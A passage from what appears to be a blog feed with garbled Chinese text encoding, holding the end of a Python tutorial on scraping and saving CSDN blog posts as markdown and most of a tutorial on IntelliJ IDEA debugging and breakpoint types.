class="hljs-built_in">getMd_Title</span>(title)<br>    md_content = <span class="hljs-built_in">getMd_content</span>(content)<br>    if choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.<span class="hljs-built_in">html2text</span>(md_title + md_content)<br>    else:<br>        markdown = html2markdown.<span class="hljs-built_in">convert</span>(md_title + md_content)<br>    theFileLocation += title<br>    # æ”¹æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»å­˜åœ¨<br>    exists = os.path.<span class="hljs-built_in">exists</span>(theFileLocation)<br>    if not exists:<br>        # ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹<br>        os.<span class="hljs-built_in">makedirs</span>(theFileLocation)<br>    theFileLocation += <span class="hljs-string">&#x27;\\&#x27;</span><br>    with <span class="hljs-built_in">open</span>(theFileLocation + <span class="hljs-built_in">filename_filter</span>(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as file:<br>        file.<span class="hljs-built_in">write</span>(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;ä¿å­˜æˆåŠŸï¼&#x27;</span>)<br>    # å¾—åˆ°æ–‡ç« ä¸­å…¶ä»–csdnè¿æ¥<br>    otherurl = <span class="hljs-built_in">getOtherurl</span>(tree)<br>    for ourl in otherurl:<br>        if <span class="hljs-string">&#x27;csdn&#x27;</span> in ourl:<br>            <span class="hljs-built_in">one</span>(ourl, theFileLocation, choose=choose)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°åšå®¢å†…å®¹ä¸­çš„å…¨éƒ¨é“¾æ¥ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯csdnåšå®¢é“¾æ¥<code>if 'csdn' in ourl:</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># å¾—åˆ°æ–‡ç« ä¸­å…¶ä»–csdnè¿æ¥</span><br>otherurl = getOtherurl(tree)<br><span class="hljs-keyword">for</span> ourl <span class="hljs-keyword">in</span> otherurl:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;csdn&#x27;</span> <span class="hljs-keyword">in</span> ourl:<br>        one(ourl, theFileLocation, <span class="hljs-attribute">choose</span>=choose)<br></code></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a class="markdownIt-Anchor" href="#æµ‹è¯•"></a> æµ‹è¯•</h2><h3 id="åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹-2"><a class="markdownIt-Anchor" href="#åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹-2"></a> åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215194642407.png" alt="image-20221215194642407" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215194709114.png" alt="image-20221215194709114" /></p><h3 id="ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹åªèƒ½æ˜¯csdnåšå®¢é“¾æ¥-2"><a class="markdownIt-Anchor" href="#ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹åªèƒ½æ˜¯csdnåšå®¢é“¾æ¥-2"></a> ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹ï¼ˆåªèƒ½æ˜¯csdnåšå®¢é“¾æ¥ï¼‰</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195529056.png" alt="image-20221215195529056" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195547044.png" alt="image-20221215195547044" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195605234.png" alt="image-20221215195605234" /></p>]]></content>
    
    
    <categories>
      
      <category>çˆ¬è™«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>çˆ¬è™«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®ç”¨çš„ IDEA Debug è°ƒè¯•æŠ€å·§</title>
    <link href="/2022/12/14/%E5%AE%9E%E7%94%A8%E7%9A%84%20IDEA%20Debug%20%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/12/14/%E5%AE%9E%E7%94%A8%E7%9A%84%20IDEA%20Debug%20%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="å®ç”¨çš„-idea-debug-è°ƒè¯•æŠ€å·§"><a class="markdownIt-Anchor" href="#å®ç”¨çš„-idea-debug-è°ƒè¯•æŠ€å·§"></a> å®ç”¨çš„ IDEA Debug è°ƒè¯•æŠ€å·§</h1><h3 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h3><p>Debug æ˜¯ç¨‹åºå‘˜çš„å¼€å‘ç¥å™¨ï¼Œä½¿ç”¨å¥½äº†å¯ä»¥å¸®åŠ©æˆ‘ä»¬éå¸¸é«˜æ•ˆçš„å·¥ä½œã€å­¦ä¹ ã€æ’æŸ¥é—®é¢˜ç­‰ã€‚æ¯«ä¸å®¢æ°”çš„è¯´ï¼Œæ˜¯å†³å®šæˆ‘ä»¬è¿›é˜¶åˆ°æ›´é«˜å±‚çº§çš„ä¸€ä¸ªé‡è¦æŠ€èƒ½ã€‚</p><ol><li><code>ç¥ç§˜å¤§ä½¬A</code>ï¼šè°ƒè¯•æŠ€å·§æ¯”ç¼–ç æŠ€å·§<strong>æ›´ä¸ºé‡è¦</strong>ï¼Œå› ä¸ºèŠ±è´¹åœ¨è°ƒè¯•ä¸Šçš„æ—¶é—´å¾€å¾€æ¯”ç¼–ç è¿˜å¤šï¼Œå­¦åˆ°çš„ä¸œè¥¿æ¯”ç¼–ç ä¸­å­¦åˆ°çš„æ›´ä¸°å¯Œ</li><li><code>ç¥ç§˜å¤§ä½¬B</code>ï¼šè°ƒè¯•æŠ€èƒ½é‡è¦æ€§ç”šâ¾„<strong>è¶…è¿‡</strong>å­¦ä¹ â¼€é—¨è¯­â¾”</li><li><code>ç¥ç§˜å¤§ä½¬C</code>ï¼šä¸ä¼šè°ƒè¯•çš„ç¨‹åºå‘˜ï¼Œ<strong>è‚¯å®š</strong>ç¼–åˆ¶ä¸å‡ºä»»ä½•å¥½çš„è½¯ä»¶</li></ol><h3 id="æ­£æ–‡"><a class="markdownIt-Anchor" href="#æ­£æ–‡"></a> æ­£æ–‡</h3><h2 id="debug-çš„å¸¸è§ä½¿ç”¨åœºæ™¯"><a class="markdownIt-Anchor" href="#debug-çš„å¸¸è§ä½¿ç”¨åœºæ™¯"></a> Debug çš„å¸¸è§ä½¿ç”¨åœºæ™¯</h2><ul><li>éœ€æ±‚ä»£ç æµ‹è¯•ï¼šé€šè¿‡debugä½ æ‰èƒ½çŸ¥é“ä½ çš„ä»£ç ç©¶ç«Ÿæ˜¯æ€ä¹ˆè¿è¡Œçš„ï¼Œæ›´å®¹æ˜“å‘ç°é—®é¢˜</li><li>é—®é¢˜æ’æŸ¥ï¼šåªè¦èƒ½è¿›å…¥åˆ°é—®é¢˜æµç¨‹çš„debugï¼Œå°±æ²¡æœ‰æ’æŸ¥ä¸äº†çš„é—®é¢˜</li><li>æºç å­¦ä¹ ï¼šæºç é€šå¸¸å¾ˆåºå¤§ï¼Œé€šè¿‡Debug æˆ‘ä»¬èƒ½æ›´æ¸…æ™°çš„çŸ¥é“æ‰§è¡Œåˆ°å“ªä¸ªåœ°æ–¹ï¼Œæ‰§è¡Œæ—¶çš„å„ä¸ªå˜é‡æ•°æ®</li></ul><h3 id="åŸºæœ¬ç•Œé¢"><a class="markdownIt-Anchor" href="#åŸºæœ¬ç•Œé¢"></a> <strong>åŸºæœ¬ç•Œé¢</strong></h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214193202245.png" alt="image-20221214193202245" /></p><p>â‘  ä»¥Debugæ¨¡å¼å¯åŠ¨æœåŠ¡ï¼Œå·¦è¾¹çš„ä¸€ä¸ªæŒ‰é’®åˆ™æ˜¯ä»¥Runæ¨¡å¼å¯åŠ¨ã€‚åœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä¸€èˆ¬ä¼šç›´æ¥å¯åŠ¨Debugæ¨¡å¼ï¼Œæ–¹ä¾¿éšæ—¶è°ƒè¯•ä»£ç ã€‚</p><p>â‘¡ æ–­ç‚¹ï¼šåœ¨å·¦è¾¹è¡Œå·æ å•å‡»å·¦é”®ï¼Œæˆ–è€…å¿«æ·é”®Ctrl+F8 æ‰“ä¸Š/å–æ¶ˆæ–­ç‚¹ï¼Œæ–­ç‚¹è¡Œçš„é¢œè‰²å¯è‡ªå·±å»è®¾ç½®ã€‚</p><p>â‘¢ Debugçª—å£ï¼šè®¿é—®è¯·æ±‚åˆ°è¾¾ç¬¬ä¸€ä¸ªæ–­ç‚¹åï¼Œä¼šè‡ªåŠ¨æ¿€æ´»Debugçª—å£ã€‚å¦‚æœæ²¡æœ‰è‡ªåŠ¨æ¿€æ´»ï¼Œå¯ä»¥å»è®¾ç½®é‡Œè®¾ç½®ã€‚</p><p>â‘£ è°ƒè¯•æŒ‰é’®ï¼šä¸€å…±æœ‰8ä¸ªæŒ‰é’®ï¼Œè°ƒè¯•çš„ä¸»è¦åŠŸèƒ½å°±å¯¹åº”ç€è¿™å‡ ä¸ªæŒ‰é’®ï¼Œé¼ æ ‡æ‚¬åœåœ¨æŒ‰é’®ä¸Šå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„å¿«æ·é”®ã€‚</p><p>â‘¤ æœåŠ¡æŒ‰é’®ï¼šå¯ä»¥åœ¨è¿™é‡Œå…³é—­/å¯åŠ¨æœåŠ¡ï¼Œè®¾ç½®æ–­ç‚¹ç­‰ã€‚</p><p>â‘¥ æ–¹æ³•è°ƒç”¨æ ˆï¼šè¿™é‡Œæ˜¾ç¤ºäº†è¯¥çº¿ç¨‹è°ƒè¯•æ‰€ç»è¿‡çš„æ‰€æœ‰æ–¹æ³•ï¼Œå‹¾é€‰å³ä¸Šè§’çš„[Show All Frames]æŒ‰é’®ï¼Œå°±ä¸ä¼šæ˜¾ç¤ºå…¶å®ƒç±»åº“çš„æ–¹æ³•äº†ï¼Œå¦åˆ™è¿™é‡Œä¼šæœ‰ä¸€å¤§å †çš„æ–¹æ³•ã€‚</p><p>â‘¦ Variablesï¼šåœ¨å˜é‡åŒºå¯ä»¥æŸ¥çœ‹å½“å‰æ–­ç‚¹ä¹‹å‰çš„å½“å‰æ–¹æ³•å†…çš„å˜é‡ã€‚</p><p>â‘§  Watchesï¼šæŸ¥çœ‹å˜é‡ï¼Œå¯ä»¥å°†VariablesåŒºä¸­çš„å˜é‡æ‹–åˆ°Watchesä¸­æŸ¥çœ‹ã€‚</p><h3 id="åŸºç¡€æ“ä½œ"><a class="markdownIt-Anchor" href="#åŸºç¡€æ“ä½œ"></a> åŸºç¡€æ“ä½œ</h3><pre><code class="hljs">1. Step over(F8)ï¼šç¨‹åºå¾€ä¸‹æ‰§è¡Œä¸€è¡Œ2. Step into(F7)ï¼šè¿›å…¥æ–¹æ³•å†…ï¼Œå¯ä»¥è¿›å…¥è‡ªå®šä¹‰æ–¹æ³•æˆ–ä¸‰æ–¹åº“æ–¹æ³•ï¼ŒJDKæ–¹æ³•æ— æ³•è¿›å…¥3. Force step into(Alt+Shift+F7)ï¼šå¼ºåˆ¶è¿›å…¥æ–¹æ³•å†…ï¼Œä¸€èˆ¬ Step into è¿›ä¸å»æ—¶å¯ä»¥ä½¿ç”¨4. Step out(Shift+F8)ï¼šé€€å‡ºæ–¹æ³•ï¼Œè·Ÿï¼ˆforceï¼‰step into é…åˆä½¿ç”¨5. Resume Program(F9)ï¼šæ¢å¤è¿è¡Œç¨‹åºï¼Œè¿è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹çš„åœ°æ–¹  6. 5ä¸ªæ“ä½œä»ä¸Šå¾€ä¸‹åˆ†åˆ«å¯¹åº”ä¸‹å›¾çš„1-5ï¼Œè¿™ä¹Ÿæ˜¯ Debug æœ€å¸¸ç”¨çš„å‡ ä¸ªåŸºç¡€æ“ä½œã€‚  </code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160315800.png" alt="image-20221214160315800" /></p><ol><li><strong>Line breakpointï¼ˆè¡Œæ–­ç‚¹ï¼‰</strong>ï¼šåœ¨æŒ‡å®šä»£ç è¡Œè®¾ç½®æ–­ç‚¹ï¼Œå±äºè¡Œçº§åˆ«çš„æ–­ç‚¹</li><li><strong>Temporary line breakpointï¼ˆä¸´æ—¶è¡Œæ–­ç‚¹ï¼‰</strong>ï¼šä¸è¡Œæ–­ç‚¹ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºè¯¥ç±»å‹çš„æ–­ç‚¹åœ¨è¢«æ¿€æ´»ä¹‹åä¼šè¢«ç«‹å³åˆ é™¤</li><li><strong>Field watchpointï¼ˆå±æ€§æ–­ç‚¹ï¼‰</strong>ï¼šè¯»å–æˆ–è€…ä¿®æ”¹å±æ€§æ—¶ä¼šæ¿€æ´»å±æ€§æ–­ç‚¹</li><li><strong>Method breakpointï¼ˆæ–¹æ³•æ–­ç‚¹ï¼‰</strong>ï¼šå®ƒæ˜¯æ ‡è®°åœ¨æ–¹æ³•é‚£ä¸€è¡Œçš„æ–­ç‚¹ï¼Œæœ‰è‡ªå·±ç‰¹æœ‰çš„å±æ€§å‚æ•°</li><li><strong>Exception breakpointï¼ˆå¼‚å¸¸æ–­ç‚¹ï¼‰</strong>ï¼šå½“ç¨‹åºæŠ›å‡ºæŒ‡å®šå¼‚å¸¸æ—¶ä¼šæ¿€æ´»å¼‚å¸¸æ–­ç‚¹ã€‚ä¸è¡Œæ–­ç‚¹ä¸åŒï¼Œå¼‚å¸¸æ–­ç‚¹ä¸éœ€è¦ä¸æºä»£ç æ˜ å°„ï¼ˆä¸éœ€è¦æ‰“åœ¨å…·ä½“æŸä¸€è¡Œä»£ç ä¸Šï¼‰ï¼Œå› ä¸ºå¼‚å¸¸æ–­ç‚¹åº”ç”¨ç¨‹åºçº§åˆ«çš„</li></ol><p>â€‹<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214175428616.png" alt="image-20221214175428616" /></p><p>Suspendï¼šæœ‰æ²¡æœ‰è®©ä½ è¯§å¼‚åˆ°ï¼Œå®ƒç«Ÿç„¶æ˜¯ä¸ªå¤é€‰æ¡†å¹¶ä¸”è¿˜å¯ä»¥ä¸è¢«é€‰ä¸­ã€‚è‹¥å®ƒä¸è¢«é€‰ä¸­çš„è¯æ–­ç‚¹çš„ç›¸å…³åŠ¨ä½œä¾ç„¶æ¿€æ´»æ‰§è¡Œï¼Œåªæ˜¯çº¿ç¨‹ä¸ä¼šè¢«ç»„å¡äº†è€Œå·²ã€‚å®ƒçš„ä¸¤ç§é˜»å¡ç­–ç•¥å¦‚ä¸‹ï¼š</p><p><strong>All</strong>ï¼šé˜»å¡è¯¥ç¨‹åºå†…æ‰€æœ‰çº¿ç¨‹ï¼ˆé»˜è®¤ï¼‰</p><p><strong>Thread</strong>ï¼šåªé˜»å¡å½“å‰æ–­ç‚¹æ‰€åœ¨çº¿ç¨‹ï¼ˆåœ¨å¤šçº¿ç¨‹è°ƒè¯•ã€è¿œç¨‹è°ƒè¯•ä¸­å¼ºçƒˆå»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰<br /><strong>Condition</strong>ï¼šè¿™å°±æ˜¯æ‰€è°“çš„æ¡ä»¶æ–­ç‚¹ï¼Œåªæœ‰ä¹¦å†™çš„è¡¨è¾¾å¼è¿”å›trueæ—¶å€™æ–­ç‚¹æ‰ä¼šè¢«æ¿€æ´»</p><p><strong>Log</strong>ï¼š</p><ul><li>å‹¾é€‰&quot;Breakpoint hit message&quot;ï¼šæ–­ç‚¹æ¿€æ´»æ—¶è¾“å‡ºæç¤ºæ—¥å¿—</li><li>å‹¾é€‰&quot;Stack trace&quot;ï¼šæ–­ç‚¹æ¿€æ´»æ—¶è¾“å‡ºç¨‹åºè°ƒç”¨æ ˆä¿¡æ¯</li><li>å‹¾é€‰&quot;Evaluate and log&quot;ï¼šå¹¶åœ¨ä¸‹é¢çš„è¾“å…¥æ¡†ä¸­è¾“å…¥&quot;args&quot;ï¼Œæ–­ç‚¹æ¿€æ´»æ—¶ä¼šè®¡ç®—å¹¶è¾“å‡ºå˜é‡ args çš„å€¼</li><li>ä»–å“¥ä¸‰æ˜¯å¯ä»¥åŒæ—¶è¢«å‹¾é€‰çš„ï¼ˆå› ä¸ºéƒ½æ˜¯å¤é€‰æ¡†~ï¼‰</li></ul><h2 id="è¡Œæ–­ç‚¹line-breakpoints"><a class="markdownIt-Anchor" href="#è¡Œæ–­ç‚¹line-breakpoints"></a> è¡Œæ–­ç‚¹ï¼ˆLine Breakpointsï¼‰</h2><p>å›¾æ ‡ï¼šçº¢è‰²åœ†å½¢</p><p>åŠŸèƒ½ï¼šæœ€å¸¸ç”¨çš„æ–­ç‚¹ï¼Œåœ¨æ–­ç‚¹æ‰€åœ¨è¡Œè¿›è¡Œæš‚åœã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160648099.png" alt="image-20221214160648099" /><br />ç†è®ºä¸Šåªè¦æœ‰è¡Œæ–­ç‚¹å’Œä¸Šé¢çš„åŸºæœ¬æ“ä½œï¼Œå°±å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„ Debug<br />è°ƒè¯•äº†ï¼Œä½†æ˜¯å¾ˆå¤šåœºæ™¯ä¸‹åªä½¿ç”¨è¿™äº›åŠŸèƒ½ï¼Œè°ƒè¯•æ˜¯å¾ˆä½æ•ˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¾æ¬¡ä»‹ç»å„ç§å¥½ç”¨çš„è°ƒè¯•æŠ€å·§ã€‚</p><h2 id="æ–¹æ³•æ–­ç‚¹method-breakpoint"><a class="markdownIt-Anchor" href="#æ–¹æ³•æ–­ç‚¹method-breakpoint"></a> æ–¹æ³•æ–­ç‚¹ï¼ˆMethod Breakpointï¼‰</h2><p>å›¾æ ‡ï¼šçº¢è‰²è±å½¢</p><p>åŠŸèƒ½ï¼šåœ¨æ–¹æ³•å…¥å£ï¼ˆentryï¼‰å’Œå‡ºå£ï¼ˆexitï¼‰éƒ½ä¼šè‡ªåŠ¨æš‚åœï¼ŒEmulatedï¼Œç›®å‰æ²¡æœ‰å‘ç°æœ‰å•¥åµç”¨ï¼ˆèœé€¼çš„å¿§ä¼¤ğŸ˜“ğŸ˜“ğŸ˜“ï¼‰ã€‚åœ¨æ–¹æ³•å…¥å£æš‚åœå¯ä»¥è®©æˆ‘ä»¬ä»å¤´è°ƒè¯•æ•´ä¸ªæ–¹æ³•ï¼Œè€Œåœ¨æ–¹æ³•å‡ºå£å¤„æš‚åœå¯ä»¥è®©æˆ‘ä»¬çœ‹åˆ°æ–¹æ³•æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œæ–¹æ³•å†…å„ä¸ªå˜é‡çš„æ•°æ®æƒ…å†µã€‚</p><p>æœ‰æ—¶å€™æˆ‘ä»¬çš„ä¸€ä¸ªæ¥å£ä¼šå­˜åœ¨å¾ˆå¤šå®ç°ç±»ï¼Œæˆ‘ä»¬çŸ­æ—¶é—´å†…éš¾ä»¥åˆ†æç©¶ç«Ÿæ˜¯è¿è¡Œåˆ°äº†å“ªä¸ªå®ç°ç±»ä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨æ–¹æ³•æ–­ç‚¹ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹æ‰“åœ¨æ¥å£æ–¹æ³•ä¸Šï¼Œè¿è¡Œåˆ°è¯¥æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è·³åˆ°å®é™…æ‰§è¡Œçš„å®ç°ç±»ï¼Œæ— éœ€é€šè¿‡ä¸Šä¸‹æ–‡ç¯å¢ƒå»åˆ†ææ˜¯å“ªä¸ªå®ç°ç±»ã€‚</p><p>ç¼ºç‚¹ï¼šå¯èƒ½ä¼šå¤§å¤§é™ä½debugé€Ÿåº¦<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160754572.png" alt="image-20221214160754572" /></p><h2 id="å­—æ®µæ–­ç‚¹field-watchpoints"><a class="markdownIt-Anchor" href="#å­—æ®µæ–­ç‚¹field-watchpoints"></a> å­—æ®µæ–­ç‚¹ï¼ˆField Watchpointsï¼‰</h2><p>å›¾æ ‡ï¼šçº¢è‰²çœ¼ç›</p><p>åŠŸèƒ½ï¼šåœ¨å­—æ®µå‘ç”Ÿå˜æ›´ï¼ˆé»˜è®¤ï¼‰æˆ–è€…è¢«è®¿é—®ï¼ˆéœ€è¦é¢å¤–è®¾ç½®ï¼‰æ—¶æš‚åœã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³çŸ¥é“æŸä¸ªå±æ€§åœ¨ä»€ä¹ˆæ—¶å€™è¢«ä¿®æ”¹ï¼Œä»å…¥å£å¤„å¼€å§‹è°ƒè¯•å¤ªéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å­—æ®µä¸Šæ‰“ä¸Šå­—æ®µæ–­ç‚¹ï¼Œè¿™æ ·å­—æ®µè¢«ä¿®æ”¹çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æš‚åœã€‚</p><p>è€Œå¦‚æœæˆ‘ä»¬æƒ³åœ¨å­—æ®µè¢«è®¿é—®æ—¶ä¹Ÿæš‚åœï¼Œåˆ™å¯ä»¥å³é”®å­—æ®µæ–­ç‚¹ï¼Œå°†ã€Field accessã€‘å‹¾é€‰ä¸Šå³å¯ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160825610.png" alt="image-20221214160825610" /></p><h2 id="å¼‚å¸¸æ–­ç‚¹exception-breakpoints"><a class="markdownIt-Anchor" href="#å¼‚å¸¸æ–­ç‚¹exception-breakpoints"></a> å¼‚å¸¸æ–­ç‚¹ï¼ˆException Breakpointsï¼‰</h2><p>å›¾æ ‡ï¼šçº¢è‰²é—ªç”µ</p><p>åŠŸèƒ½ï¼šå¯ä»¥åœ¨æŠ›å‡ºå¼‚å¸¸çš„åœ°æ–¹è¿›è¡Œæš‚åœ</p><p>å¼‚å¸¸æ–­ç‚¹æ˜¯æ— éœ€åœ¨å…·ä½“çš„ä»£ç ä¸Šæ‰“æ–­ç‚¹çš„ï¼Œè€Œæ˜¯åœ¨æ–­ç‚¹è¯¦æƒ…é¡µä¸­ç›´æ¥æ·»åŠ ï¼Œåç»­åœ¨æ‰§è¡Œæ—¶ï¼Œå¦‚æœæŠ›å‡ºæˆ‘ä»¬ç›‘å¬çš„å¼‚å¸¸ï¼Œåˆ™ä¼šè‡ªåŠ¨æš‚åœåœ¨æŠ›å‡ºå¼‚å¸¸çš„åœ°æ–¹ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214162657053.png" alt="image-20221214162657053" /><br />è¿™ä¸ª<code>Any exception</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214162758993.png" alt="image-20221214162758993" /></p><p>æ•è·çš„å¼‚å¸¸ä¸å¤ªå¯¹å•Š ï¼Œç”¨<strong>Resume Program</strong>è·³äº†å¾ˆå¤šæ­¥ã€‚éƒ½æ²¡æœ‰æ‰¾åˆ°<code>java.lang.ArithmeticException</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214163305235.png" alt="image-20221214163305235" /></p><p>è¿˜æ˜¯ç›´æ¥æŒ‡å®šå¼‚å¸¸ä½¿ç”¨æ¯”è¾ƒå¥½ã€‚</p><p>ä½†æ˜¯åŒç†ï¼Œå®ƒä¹Ÿæä¾›ä¸€ä¸ªç‰¹æœ‰çš„æ–­ç‚¹å‚æ•°ï¼š</p><ul><li><code>Notification</code>ï¼š<br />- â€œCatch excetionâ€ï¼šç¨‹åºåœ¨æ•è·ï¼ˆTry Catchï¼‰è¿™ä¸ªå¼‚å¸¸æ—¶æ¿€æ´»æ–­ç‚¹<br />- â€œUncatch excetionâ€ï¼šä¸catchæ•è·å¼‚å¸¸æ—¶æ¿€æ´»æ–­ç‚¹</li></ul><h2 id="ä¸»åŠ¨æŠ›å¼‚å¸¸throw-exception"><a class="markdownIt-Anchor" href="#ä¸»åŠ¨æŠ›å¼‚å¸¸throw-exception"></a> ä¸»åŠ¨æŠ›å¼‚å¸¸ï¼ˆThrow Exceptionï¼‰</h2><p>å›¾æ ‡ï¼šæ— ï¼ŒFrames å †æ ˆä¸­å³é”®æ˜¾ç¤º</p><p>åŠŸèƒ½ï¼šä¸»åŠ¨æŠ›å‡ºæŒ‡å®šå¼‚å¸¸</p><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ä»£ç æ„é€ äº†ä¸€ä¸ªå¼‚å¸¸ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å…¶å®æ˜¯ä¸å¤ªæ–¹ä¾¿çš„ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åœ¨è¿œç¨‹ç¯å¢ƒæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œéœ€è¦ä¿®æ”¹ä»£ç é‡æ–°éƒ¨ç½²ï¼Œæµ‹è¯•å®Œåè¿˜è¦ä¿®æ”¹å›æ¥å†æ¬¡éƒ¨ç½²ã€‚è€Œ</p><p>Throw Exception åˆ™å¯ä»¥ç›´æ¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œé¿å…äº†è¿™äº›ç¹ççš„æµç¨‹ã€‚  ï¼ˆæ„Ÿè§‰æ²¡å•¥ç”¨ï¼‰</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214171751405.png" alt="image-20221214171751405" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214171801643.png" alt="image-20221214171801643" /></p><h2 id="é™å¸§drop-frame"><a class="markdownIt-Anchor" href="#é™å¸§drop-frame"></a> é™å¸§ï¼ˆDrop Frameï¼‰</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172440724.png" alt="image-20221214172440724" /><br />åŠŸèƒ½ï¼šå½“æˆ‘ä»¬ Debug ä» A æ–¹æ³•è¿›å…¥ B æ–¹æ³•æ—¶ï¼Œé€šè¿‡é™å¸§ï¼ˆé€€å¸§ï¼‰å¯ä»¥è¿”å›åˆ°è°ƒç”¨ B æ–¹æ³•å‰ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å†ä¸€æ¬¡è°ƒç”¨ B æ–¹æ³•ã€‚</p><p>é€šå¸¸ç”¨äºå½“æˆ‘ä»¬å¿«æ‰§è¡Œå®Œ B æ–¹æ³•åï¼Œå‘ç°æŸä¸ªé‡è¦æµç¨‹è¢«æˆ‘ä»¬è·³è¿‡äº†ï¼Œæƒ³å†çœ‹ä¸€ä¸‹ï¼Œåˆ™æ­¤æ—¶å¯ä»¥å…ˆå›é€€åˆ° A æ–¹æ³•ï¼Œç„¶åå†æ¬¡è¿›å…¥ B æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬çŸ¥é“æ–¹æ³•çš„æ‰§è¡Œå’Œç»“æŸåœ¨ JVM ä¸­å¯¹åº”çš„æ˜¯æ ˆå¸§çš„å…¥æ ˆå’Œå‡ºæ ˆï¼Œå› æ­¤æ ˆå¸§æè¿°çš„å°±æ˜¯æ–¹æ³•å¯¹åº”çš„æ¨¡å‹ï¼Œè€Œé™å¸§ï¼ˆé€€å¸§ï¼‰åˆ™å¯¹åº”çš„å°±æ˜¯å›é€€åˆ°ä¸Šä¸€ä¸ªæ–¹æ³•ã€‚</p><h2 id="æ–­ç‚¹æ¡ä»¶condition"><a class="markdownIt-Anchor" href="#æ–­ç‚¹æ¡ä»¶condition"></a> æ–­ç‚¹æ¡ä»¶ï¼ˆConditionï¼‰</h2><p>åŠŸèƒ½ï¼šå½“ç¨‹åºæ‰§è¡Œåˆ°æ–­ç‚¹ä½ç½®æ—¶ï¼Œéœ€è¦ Condition ä¸­çš„è¡¨è¾¾å¼è¿”å› trueï¼Œæ‰ä¼šæš‚åœï¼Œå¦åˆ™ä¼šç›´æ¥è·³è¿‡ã€‚</p><p>ç”¨äºæ–­ç‚¹æ‰€åœ¨çš„åœ°æ–¹æ‰§è¡Œæ¬¡æ•°è¿‡å¤šæ—¶ï¼Œé¿å…æµªè´¹æ—¶é—´åœ¨ä¸æƒ³å…³æ³¨çš„æµç¨‹ä¸Šã€‚ä¾‹å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ª Spring bean çš„åˆå§‹åŒ–å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬æƒ³è·³è¿‡å…¶ä»– 